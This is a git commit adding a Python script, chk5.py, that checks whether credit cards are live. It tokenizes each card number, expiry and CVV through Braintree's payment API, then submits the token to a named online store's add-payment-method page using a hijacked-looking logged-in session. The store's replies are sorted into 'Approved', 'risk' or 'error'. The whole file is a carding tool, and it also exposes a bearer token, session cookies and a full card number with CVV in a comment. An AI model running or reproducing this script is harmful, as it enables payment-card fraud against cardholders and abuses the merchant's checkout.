a61db240b81c2165baa2f86d828950c0df603895
yousef12102008 <moh552vbnm@gmail.com>
2024-07-02 07:38:37 +0300

    Add files via upload

---
+++ chk5.py
@@ -0,0 +1,163 @@
+def chk(card):
+	
+	import requests, re, base64, random, string, user_agent, time
+	from requests_toolbelt.multipart.encoder import MultipartEncoder
+	
+	from requests.packages.urllib3.exceptions import InsecureRequestWarning
+	
+	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+	
+	card = card.strip()
+	parts = re.split('[|/:]', card)
+	n = parts[0]
+	mm = parts[1]
+	yy = parts[2]
+	cvc = parts[3]
+
+	if "20" in yy:
+		yy = yy.split("20")[1]
+	
+	
+	r = requests.session()
+	
+
+
+
+
+
+
+
+	headers = {
+    'authority': 'payments.braintree-api.com',
+    'accept': '*/*',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk5ODA2MzIsImp0aSI6IjFkYTNkNmNlLTZkMTItNGIyZS04ZmZhLTkzNjE4ZDEyM2ZmNyIsInN1YiI6InI4OHpqaGR5OWhqa3E3em4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InI4OHpqaGR5OWhqa3E3em4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.lU6tsAda3F0LIZHaGxi62tpdjk3khUePU1KQbHX-5eAORnBDuI6hpaRvKoNSHTo-CBUN-0XXmr_Jh9N6vMQkQQ',
+    'braintree-version': '2018-05-10',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'pragma': 'no-cache',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+
+	json_data = {
+    'clientSdkMetadata': {
+        'source': 'client',
+        'integration': 'custom',
+        'sessionId': '102a53eb-2757-43fc-8284-dc460965d251',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': n,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"102a53eb-2757-43fc-8284-dc460965d251"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+
+
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+
+
+
+
+
+
+
+
+
+
+	cookies = {
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-07-02%2004%3A22%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-07-02%2004%3A22%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    '_ga': 'GA1.1.925692818.1719894180',
+    'wordpress_logged_in_5a9b1c4730164376cc88c4f3afed3405': 'moh5527vbnm%7C1721103794%7Cd840k1iyrr1as3bMI0ZoEO2kGSkaNdMAt6dJivlWm0k%7C0167a2bb1edd0dea578ca020b9cfdefeaaa89cc634672aed0bc95159b0adf667',
+    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_3S1SBY244N': 'GS1.1.1719894180.1.1.1719894253.0.0.0',
+}
+
+	headers = {
+    'authority': 'www.thevacuumfactory.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-02%2004%3A22%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-02%2004%3A22%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.925692818.1719894180; wordpress_logged_in_5a9b1c4730164376cc88c4f3afed3405=moh5527vbnm%7C1721103794%7Cd840k1iyrr1as3bMI0ZoEO2kGSkaNdMAt6dJivlWm0k%7C0167a2bb1edd0dea578ca020b9cfdefeaaa89cc634672aed0bc95159b0adf667; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fadd-payment-method%2F; _ga_3S1SBY244N=GS1.1.1719894180.1.1.1719894253.0.0.0',
+    'origin': 'https://www.thevacuumfactory.com',
+    'pragma': 'no-cache',
+    'referer': 'https://www.thevacuumfactory.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+
+	data = {
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'master-card',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce': tok,
+    'wc_braintree_device_data': '',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': '68159ce882',
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
+
+	response = requests.post(
+    'https://www.thevacuumfactory.com/my-account/add-payment-method/',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+)
+	
+	text = response.text
+	
+	pattern = r'Status code (.*?)\s*</li>'
+	
+	match = re.search(pattern, text)
+	if match:
+		result = match.group(1)
+		if 'risk_threshold' in text:
+		    result = "RISK: Retry this BIN later."
+	else:
+		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+			result = "1000: Approved"
+		else:
+			result = "Error"
+			
+	return result
+	
